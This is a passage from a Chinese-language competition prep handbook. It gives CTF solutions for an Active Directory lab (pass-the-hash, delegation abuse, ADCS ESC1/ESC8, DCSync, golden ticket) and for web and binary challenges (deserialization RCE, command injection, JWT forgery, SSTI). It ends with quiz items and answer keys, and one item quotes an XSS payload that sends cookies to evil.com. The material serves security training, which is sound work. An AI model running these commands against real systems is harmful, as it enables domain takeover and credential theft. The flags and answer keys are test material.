  1. 使用 NetExec 讀取 gMSA 密碼：`netexec ldap 10.10.10.10 -u svc_fileadmin -p ... --gmsa`。
  2. 提取 `gmsa_web$` 的 NT Hash。
  3. 實施 Pass-the-Hash 存取限制共享：`smbclient //FILE01/WebApp$ -U 'DBGT\gmsa_web$' --pw-nt-hash <hash>`。
* **【驗收標準 Flag】**：`DBGT{gmsa_read_pth_757f65b3}`

#### 【關卡 D5】委派的信任 (FILE01 Restricted)
* **【選手考卷題目描述】**：
  > 檔案伺服器被配置了不當的 Kerberos 委派特權；請利用委派機制（或 RBCD）冒充管理員身分完全接管 FILE01 主機。
* **【解題思路與操作】**：
  1. 使用 `getST.py` 利用 `gmsa_web$` 的約束委派：
     `getST.py -spn CIFS/FILE01.corp.dbgt.tw -impersonate Administrator ...`。
  2. 匯入產生的 Kerberos 票證（KRB5CCNAME）。
  3. 使用 `psexec.py -k -no-pass FILE01.corp.dbgt.tw` 取得 FILE01 的 SYSTEM 權限，讀取 `C:\Shares\Restricted\FLAG18.txt`。
* **【驗收標準 Flag】**：`DBGT{file01_delegation_access_843c429c}`

#### 【關卡 D6】創辦人的保險箱 (FILE01 wu 的 EFS 檔)
* **【選手考卷題目描述】**：
  > 檔案伺服器上的備份資料夾使用機器 DPAPI 保護了網域管理員 `wu.gongtang` 的憑證；請解密憑證並讀取其以 EFS (加密檔案系統) 保護的機密文件。
* **【解題思路與操作】**：
  1. 在 FILE01 匯出本機 DPAPI Masterkey：`dpapi.py masterkey -system -security`。
  2. 解密 `C:\Backup` 中的憑證 Blob，獲取網域管理員 `wu.gongtang` 明文密碼。
  3. EFS 加密檔即使 SYSTEM 也無法直接查看，切換為 `wu.gongtang` 身分成功解密並讀取 Flag。
* **【驗收標準 Flag】**：`DBGT{dpapi_efs_wugongtang_858af8a5}`

---

### 👑 E 區 · 支配 (Domination) — 網域最高控制權奪取

#### 【關卡 E1】憑證的偽裝 (DC01 FLAG20)
* **【選手考卷題目描述】**：
  > 企業內部 AD CS 憑證服務發布了不安全的憑證範本；請利用 ESC1 弱點簽發一張具備 Domain Admin 身分的認證憑證。
* **【解題思路與操作】**：
  1. 使用 Certipy 掃描易受攻擊的範本：`certipy find -u svc_fileadmin ...`，發現範本 `DBGTWebEnroll` 具備 `ENROLLEE_SUPPLIES_SUBJECT`。
  2. 請求管理員憑證（Windows Server 2025 強制要求帶 SID 繫結）：
     `certipy req -u svc_fileadmin -p ... -ca corp-DC01-CA -template DBGTWebEnroll -upn administrator@corp.dbgt.tw -sid <Domain_SID>-500`。
  3. 使用簽發之 PFX 憑證進行驗證換取 NT Hash：`certipy auth -pfx administrator.pfx`，讀取 `C:\DA_Loot\FLAG20.txt`。
* **【驗收標準 Flag】**：`DBGT{adcs_esc1_administrator_d59351c4}`

#### 【關卡 E2】逼它回頭 (DC01 FLAG21)
* **【選手考卷題目描述】**：
  > AD CS 的 Web 註冊端點未啟用 NTLM 簽署保護；請強制網域控制站發起認證回連並將身分中繼至 CA 取得機器帳號憑證 (ESC8)。
* **【解題思路與操作】**：
  1. 攻擊機啟動中繼監聽：`ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp --adcs --template DomainController`。
  2. 使用 PetitPotam 強制 DC01 發起認證回連：`coerce_plus.py -u svc_fileadmin 10.10.10.10 <Attacker_IP>`。
  3. 中繼成功取得 DC01 機器帳號憑證 `DBGTDC01$`。
* **【驗收標準 Flag】**：`DBGT{coercion_relay_esc8_c013e144}`

#### 【關卡 E3】王國的鑰匙 (krbtgt 雜湊提取)
* **【選手考卷題目描述】**：
  > 取得網域管理員特權後，請透過 DCSync 複寫機制，匯出全網域核心金鑰 `krbtgt` 帳號的 NT 雜湊值（注意：本題繳交格式為 32 位小寫十六進位字串，不含大括號）。
* **【解題思路與操作】**：
  1. 使用管理員憑證或 Hash 執行 DCSync：
     `impacket-secretsdump -just-dc-user krbtgt corp.dbgt.tw/administrator@10.10.10.10`。
  2. 提取輸出中的 `krbtgt:502:aad3b435b51404eeaad3b435b51404ee:06b2f76f2b611851bb42a0c55f7264ae:::`。
* **【驗收標準 Answer】**：`06b2f76f2b611851bb42a0c55f7264ae`

#### 【關卡 E4】黃金門票 (Golden Ticket 偽造)
* **【選手考卷題目描述】**：
  > 利用 E3 取得之 `krbtgt` 金鑰，離線偽造一張黃金票據 (Golden Ticket)，冒充網域最高管理者存取受限資產。
* **【解題思路與操作】**：
  1. Server 2025 預設停用 RC4，黃金票據必須使用 AES256 建立：
     `ticketer.py -domain corp.dbgt.tw -domain-sid <SID> -aesKey <krbtgt_aes256> administrator`。
  2. 匯入偽造票據至環境變數 `export KRB5CCNAME=administrator.ccache`。
  3. 存取 DC 專屬受限目錄讀取 Flag。
* **【驗收標準 Flag】**：`DBGT{golden_ticket_da_47cb3f47}`

#### 【關卡 E5】對不供糖・終 (網域控制站最高支配)
* **【選手考卷題目描述】**：
  > 完成對不供糖網域全面接管，登入網域控制站 DC01，讀取位於 Administrator 桌面的終極 Flag！
* **【解題思路與操作】**：
  1. 以 Domain Admin 身分執行遠端指令：
     `wmiexec.py -k -no-pass DBGTDC01.corp.dbgt.tw "type C:\Users\Administrator\Desktop\root.txt"`。
* **【驗收標準 Flag】**：`DBGT{final_root_domain_admin_43830562}`

---

## ⚔️ 模組四：逆向與進階 Web CTF II（6 大題 12 道奪旗題本與解密）

> 📂 **[內部離線題本對應]**：`20260728 Skills Competition/題目/CTFII/題目本.md`

### 🍰 Web 01 - 可可波的糖果箱 (18 分, 3 把 Flag)
* **【官方考卷題目情境】**：
  > 身為超氣人的 vTuber，可可波為了和觀眾互動，親手 vibe 了一個糖果箱，專門蒐集觀眾的提問並在直播中一一回答。只是，一個自己刻出來的糖果箱，真的安全嗎？
  > 目標位址：`http://192.168.10.82:8081/`。
  > 官方提示：
  > 1. 你有找到奇怪的服務嗎？掃一下 Port 你就知道。
  > 2. 找不到密碼？把伺服器邀請過來驗證你就可以...
  > 3. 想要成為管理員？Session 放在哪？Session 放些什麼？
  > 4. 改不動資料？反序列化結構需要很小心長度。
  > 5. 找不到合適的 Payload？PHPGGC 每一個都試試看？

* **【子題 1：獲取 Redis 服務認證密碼】**
  * **題目任務**：排查未授權與反向連線弱點，截獲後端資料庫密碼。
  * **解法步驟**：
    1. 攻擊機本機監聽 Redis 預設埠：`nc -lvnp 6379`。
    2. 瀏覽網站端點 `/api/test/redis`，將測試連線 IP 填寫為攻擊機 IP。
    3. 伺服器反向連線並發送 `AUTH <password>` 指令，nc 終端直接捕獲密碼。
  * **標準答案**：`FLAG{g1ft_me_y0ur_p@ssw0rd}`

* **【子題 2：竄改 Session 提權管理員】**
  * **題目任務**：分析 Session 存儲結構，提權為網站管理員。
  * **解法步驟**：
    1. 使用子題 1 密碼連線 Redis 伺服器：`redis-cli -h 192.168.10.82 -a ...`。
    2. 執行 `keys *` 搜尋 Session 鍵值。
    3. 檢視 Session 內容發現 PHP 序列化資料，將其中的 `role:user` 竄改為 `admin`，注意嚴格修正長度欄位 `s:5:"admin"`。
  * **標準答案**：`FLAG{How_d0_you_turn_th1s_0n}`

* **【子題 3：PHP 反序列化漏洞 RCE 奪旗】**
  * **題目任務**：構造反序列化 POP Chain，在伺服器寫入 WebShell 讀取根目錄 Flag。
  * **解法步驟**：
    1. 使用 `phpggc` 生成利用鏈：`phpggc monolog/rce1 system "cat /FLAG"`（目標寫入目錄 `/var/www/html/public`）。
    2. 將 Payload 透過 Redis 寫入使用者的 profile 欄位。
    3. 在網站前台執行「回文」功能，觸發反序列化執行任意指令。
  * **標準答案**：`FLAG{L0g_2_th3_sh3ll}`

---

### 🔍 Web 02 - 可可波的破綻 (24 分, 3 把 Flag)
* **【官方考卷題目情境】**：
  > 你無意間找到超氣人 vTuber 可可波寫壞的網站，真的可波！你可以找出其中的秘密嗎？
  > 目標位址：`http://192.168.10.83:8082/` (Kali 已預裝 VisualVM)。
  > 官方提示：1. 機器人看不到？ 2. 去 Jolokia 手冊找找看蛛絲馬跡 3. 參數的另外一種輸入方法？ 4. heapdump 裡搜尋 eyJ 找到 JWT...

* **【子題 1：Jolokia WAF 繞過與記憶體傾印】**
  * **題目任務**：發現隱藏維運端點，繞過前端 WAF 檢驗並匯出 Heap Dump。
  * **解法步驟**：
    1. 讀取 `robots.txt` 發現隱藏端點 `/jolokia/`。
    2. 前端 WAF 阻擋了路徑，依據 Jolokia 官方手冊，使用 URL 參數模式 `?p=` 繞過 WAF 檢驗。
    3. 透過 MBean `HotSpotDiagnostic` 觸發 JVM Heap Dump，並自 `/heapdumps/` 路徑下載記憶體快照。
  * **標準答案**：`FLAG{a9EN7_d0N7_REA0L7he_Fux0r1n9_MANuaL}`

* **【子題 2：JWT 金鑰還原與身分偽造】**
  * **題目任務**：分析記憶體快照還原簽名金鑰，偽造有效管理員 Token 存取隱藏端點。
  * **解法步驟**：
    1. 使用 VisualVM 或 `strings` 分析 heapdump，搜尋 `eyJ` 發現過期之 JWT，確認演算法為 `HS256`。
    2. 深入比對 Java 字串物件，成功提取簽名金鑰（Secret Key）。
    3. 搜尋發現未公開管理端點 `/admin/tasks/run?taskid=${}`。
    4. 自行以該金鑰簽發尚未過期的管理員 JWT，請求端點自 Response Header 取得 Flag。
  * **標準答案**：`FLAG{1s_5tR1Ng5_3noU9H_FoR_yoU_7}`

* **【子題 3：指令注入 Command Injection RCE】**
  * **題目任務**：挖掘後台診斷功能漏洞，實現任意指令執行。
  * **解法步驟**：
    1. 測試端點 `/admin/tasks/run?taskid=`，發現其底層直接使用 Shell 拼接執行。
    2. 構造指令注入 Payload：`; cat /FLAG`，成功取得根目錄 Flag。
  * **標準答案**：`FLAG{ba6y_1Nj3c710n}`

---

### 🐱 Web 03 - 可可波的福利 (18 分, 3 把 Flag)
* **【官方考卷題目情境】**：
  > 超氣人 vTuber 可可波用 DDD (Deadline-Driven-Development) 架設了一個 OnlyCats 網站！Golang！加強 WAF！只能註冊登入！真的安全了吧！
  > 目標位址：`http://192.168.10.81:8083/`。

* **【子題 1：Golang 併發條件競爭 (Race Condition)】**
  * **題目任務**：利用併發校驗缺陷，註冊非法字元帳號。
  * **解法步驟**：利用 Golang 錯誤處理與併發檢驗之間的時間差，多線程同時發起註冊請求，繞過特殊字元檢驗。以該帳號登入後在 `/me` 取得 Flag。
  * **標準答案**：`FLAG{Y0u_w1n_7H3_R4c3}`

* **【子題 2：RFC 2047 MIME 編碼繞過 WAF】**
  * **題目任務**：繞過關鍵字黑名單，註冊包含 `admin` 的特權帳號。
  * **解法步驟**：WAF 阻擋了字串 `admin`，但後端處理 Email 支援 **RFC 2047 編碼**（如 `=?UTF-8?B?YWRtaW4=?=@domain.com`）。後端解碼後判定具備 admin 權限，登入 `/me` 取得 Flag。
  * **標準答案**：`FLAG{rFc_2047_1s_c000000000L}`

* **【子題 3：SSTI 模板注入與開發者後門】**
  * **題目任務**：利用模版注入漏洞洩漏內部變數，觸發開發者後門。
  * **解法步驟**：利用 Golang Template SSTI 語法 `{{printf "%+v" .}}` 印出當前結構體內部未公開成員，發現隱藏之 `dev_url` 後門。訪問後門端點直接取得 RCE。
  * **標準答案**：`FLAG{BAby_73MPlA73_1Nj3c710N}`

---

### 🎲 二進位逆向題組 (Bin 01~03)

#### 【Bin 01】命運選中之人 (8 分)
* **【官方考卷題目情境】**：
  > 可可波發現了一個會不斷產出寶物的神奇箱子，只要建立新的虛擬分身就能重複領取。連接目標：`nc 192.168.10.81 11001`。
* **【題目考點與解題步驟】**：
  1. 邏輯要求機率湊成 0，但天選之人判定時間已經過期。
  2. 逆向發現系統使用 32 位元整數儲存時間戳，存在 **Year 2038 Timestamp Overflow** 漏洞。
  3. 生日年填寫 `2039` 觸發整數溢位為負數，將時間逆轉，數值順序輸入 `10, 10, 5, 5, 0`，觸發判定取得 Flag。
* **【標準答案】**：`FLAG{the_god_says_yes_but_libc_says_no}`

#### 【Bin 02】歡迎來到冒險者公會 (16 分)
* **【官方考卷題目情境】**：
  > 你的第一個委託是……採集 Shellcode！？連接目標：`nc 192.168.10.81 11002`。
* **【題目考點與解題步驟】**：
  1. 逆向分析發現冒險日誌記錄玩家採集的 Log 存在 Stack Overflow 溢位。
  2. 遊戲布告欄功能會直接洩漏「背包 (Bag)」的記憶體絕對位址。
  3. 將 Shellcode 放入背包中，藉由 Log 溢位覆蓋 Return Address 指向背包記憶體位址，退出遊戲時觸發執行讀取 `/FLAG`。
* **【標準答案】**：`FLAG{she11c0de_hunter_wilds}`

#### 【Bin 03】GBA 卡帶遊戲逆向 (16 分)
* **【官方考卷題目情境】**：
  > 可可波回歸初心，試著寫了一款 GBA 遊戲，並偷偷把 Flag 藏在遊戲裡。目標檔案：`dango.gba` (Kali 已安裝 `mGBA` 模擬器)。
  > 官方提示：1. 傳說秘技：↑ ↑ ↓ ↓ ← → ← → B A？ 2. 先從字串定位開始，了解 Screen 區分。 3. 識別操作流，找到隱藏的房間。
* **【題目考點與解題步驟】**：
  1. 韌體架構為 **ARM v7 32-bit Little-Endian**，載入 Base 位址 `0x08000000`。
  2. 在 Ghidra 中搜尋首頁字串，交叉引用定位至玩家按鍵輸入處理函式（Input Handler）。
  3. 分析狀態機跳轉邏輯，解出隱藏房間的密碼輸入序列為：`L R A B B A ↑ ↑ ↓ ↓`。
  4. 於 mGBA 模擬器中依序按下該手把組合鍵，進入秘密房間取得 Flag。
* **【標準答案】**：`FLAG{P1aying_th3_g@me_0r_9aming_th3_g@me}`

---

## 📝 模組五：金盾初賽 100 題客觀單選題全真模擬精選卷

> 📂 **[內部離線題庫精萃]**：萃取自內部離線題庫 `安全题库1.xlsx` (895 題)、`安全题库2.xlsx` (407 題) 與資安筆試題庫（詳見 [sources_index.md](../90_runs/sources_index.md)）。

### 試卷核心 10 大考點精華試讀（附詳解）

#### 1. 【Web 安全】
* **Q1. 關於 SQL Injection 防禦，下列何種手段能從根本上杜絕 SQL 注入風險？**
  * (A) 對輸入字串進行特殊符號黑名單過濾
  * (B) 採用參數化查詢 (Prepared Statements) 預編譯語法
  * (C) 部署 Web 應用防火牆 (WAF)
  * (D) 將資料庫連線帳號降為一般權限
  * **【標準答案】(B)**
  * **【解析】** 黑名單過濾容易被大小寫、雙寫或編碼繞過；WAF 僅能作為邊界防禦；唯有參數化查詢將 SQL 語法結構與資料參數徹底分離，使輸入參數永遠不會被當作 SQL 語法解析執行。

* **Q2. 攻擊者在目標網站留言板植入 `<script>document.location='http://evil.com/c?'+document.cookie</script>`，當其他使用者瀏覽該留言時觸發，此攻擊屬於？**
  * (A) 反射型 XSS (Reflected XSS)
  * (B) 儲存型 XSS (Stored XSS)
  * (C) DOM 型 XSS (DOM-based XSS)
  * (D) 跨站請求偽造 (CSRF)
  * **【標準答案】(B)**
  * **【解析】** 惡意代碼持久保存在伺服器資料庫中，所有瀏覽該頁面的正常使用者皆會遭受攻擊，為典型的儲存型 XSS。

* **Q3. 防範 CSRF (跨站請求偽造) 攻擊，下列措施中最有效且最常使用的是？**
  * (A) 使用 HTTPS 取代 HTTP
  * (B) 增加驗證碼 (CAPTCHA) 與使用隨機 Anti-CSRF Token
  * (C) 嚴格過濾使用者輸入的 `<script>` 標籤
  * (D) 設定 Cookie 的 HttpOnly 屬性
  * **【標準答案】(B)**
  * **【解析】** CSRF 利用瀏覽器自動攜帶 Cookie 的特性，HttpOnly 僅能防範 XSS 竊取 Cookie，無法阻擋 CSRF；Anti-CSRF Token 與 SameSite Cookie 才是阻擋 CSRF 的標準方案。

#### 2. 【網路架構與協定安全】
* **Q4. 在 TCP/IP 通訊中，SYN Flood 阻斷服務攻擊利用的是哪一個交握階段的漏洞？**
  * (A) 三向交握的第一次（SYN）與第二次（SYN+ACK）
  * (B) 四次揮手斷開連線階段
  * (C) 數據傳輸確認階段
  * (D) DNS 解析快取階段
  * **【標準答案】(A)**
  * **【解析】** 攻擊者發送偽造 IP 的 SYN 請求，伺服器回應 SYN+ACK 後進入半連接（SYN_RCVD）狀態等待第三次 ACK，海量半連接導致連線資源耗盡。標準對策為啟用 SYN Cookie。

* **Q5. 關於 IPsec 協定中的 AH (Authentication Header) 與 ESP (Encapsulating Security Payload)，下列敘述何者正確？**
  * (A) AH 支援資料加密，ESP 僅支援驗證
  * (B) AH 無法穿透 NAT，ESP 搭配 NAT-T 可穿透 NAT
  * (C) AH 與 ESP 均不支援重送攻擊 (Anti-replay) 防護
  * (D) 傳輸模式 (Transport Mode) 下 AH 會封裝整個原始 IP 封包
  * **【標準答案】(B)**
  * **【解析】** AH 的雜湊完整性檢驗範圍包含外層 IP Header，NAT 轉換 IP 會破壞 AH 雜湊校驗，因此 AH 無法穿透 NAT；ESP 不校驗外層 IP Header，且支援資料加密。

#### 3. 【密碼學與身份驗證】
* **Q6. RSA 非對稱加密演算法中，若已知公鑰為 $(n, e)$，私鑰為 $(n, d)$，其安全強度主要建立在下列何種數學難題之上？**
  * (A) 離散對數難題 (Discrete Logarithm Problem)
  * (B) 大整數質因數分解難題 (Large Integer Factorization)
  * (C) 橢圓曲線離散對數難題 (ECDLP)
  * (D) 格密碼難題 (Lattice-based Problem)
  * **【標準答案】(B)**

* **Q7. 關於對稱加密演算法的分組模式，下列何種模式因為「相同的明文分組會產生相同的密文分組」而極不安全，嚴禁於實務中傳輸機密資料？**
  * (A) CBC (Cipher Block Chaining)
  * (B) ECB (Electronic Codebook)
  * (C) CFB (Cipher Feedback)
  * (D) GCM (Galois/Counter Mode)
  * **【標準答案】(B)**

#### 4. 【系統安全與數位鑑識】
* **Q8. 根據 RFC 3227 規範，資安事件現場進行數位證據保全時，下列媒介之揮發性順序（由最易揮發到最不易揮發）何者正確？**
  * (A) 暫存器與快取 ➔ 記憶體 (RAM) ➔ 路由表/進程表 ➔ 硬碟 ➔ 備份磁帶
  * (B) 暫存器與快取 ➔ 路由表/進程表 ➔ 記憶體 (RAM) ➔ 硬碟 ➔ 備份磁帶
  * (C) 記憶體 (RAM) ➔ 暫存器與快取 ➔ 硬碟 ➔ 路由表 ➔ 備份磁帶
  * (D) 硬碟 ➔ 記憶體 (RAM) ➔ 路由表 ➔ 備份磁帶 ➔ 暫存器
  * **【標準答案】(B)**

* **Q9. 在 Windows 事件檢視器 (Event Log) 中，哪一個 Event ID 代表「使用者成功登入 (Logon Success)」？**
  * (A) 4624
  * (B) 4625
  * (C) 4720
  * (D) 7045
  * **【標準答案】(A)**
  * **【解析】** 4624 為登入成功、4625 為登入失敗、4720 為建立新使用者帳號、7045 為安裝新服務。

* **Q10. Linux 系統中，攻擊者植入挖礦惡意軟體時，最常利用哪一個排程檔案以維持常駐權限？**
  * (A) `/etc/fstab`
  * (B) `/etc/hosts`
  * (C) `/var/spool/cron/crontabs/` 或 `/etc/crontab`
  * (D) `/etc/resolv.conf`
  * **【標準答案】(C)**

---

## 👥 模組六：三人小組包幹實戰檢定表

在最後 4 天（Day 27-30）模擬與複習時，三位隊員請依照以下分工清單進行雙向提問抽背：

| 隊員 | 責任科目 | 必答檢定考點 (口試抽測題) |
| :---: | :--- | :--- |
| **隊員 A** | **Web & 治理法規** | 1. 說明資通安全管理法 1~4 級事件的通報與復原時限？*(答：1級1h/72h；4級1h/36h)*<br>2. 為什麼黑名單與 WAF 無法保證根治 SQL 注入？*(答：編碼繞過與非字串注入，必用預編譯)*<br>3. CTF II Web 03 是利用什麼協定編碼繞過 admin 檢驗？*(答：RFC 2047 MIME)* |
| **隊員 B** | **主機 & 數位鑑識** | 1. RFC 3227 規定的證據揮發性順序前三名？*(答：暫存器/快取 ➔ 路由表與ARP/進程 ➔ 系統記憶體)*<br>2. 發現 Linux 遭植入 `kdevtmpfsi` 挖礦木馬的第一道處置指令？*(答：kill -STOP [PID] 暫停進程)*<br>3. AD CS ESC1 漏洞的成因與防禦設定？*(答：範本允許自訂 SAN 且具 Client Auth；防禦為強制管理員審核)* |
| **隊員 C** | **網路 & 二進位** | 1. 說明 SYN Flood 攻擊原理與 SYN Cookie 的核心運作機制？*(答：以初始序號攜帶雜湊狀態，不分配連線佇列)*<br>2. 寫出針對 LockBit TLS 指紋進行告警的 Suricata 規則？*(答：`tls.cert_fingerprint; content:"...";`)*<br>3. CTF II Bin 01 是利用什麼漏洞逆轉時間？*(答：2038 年 32-bit Timestamp 整數溢位)* |

---
*手冊編制完成，請隊員立即於 Day 27 與 Day 29 全真模擬中嚴格對照驗證！*
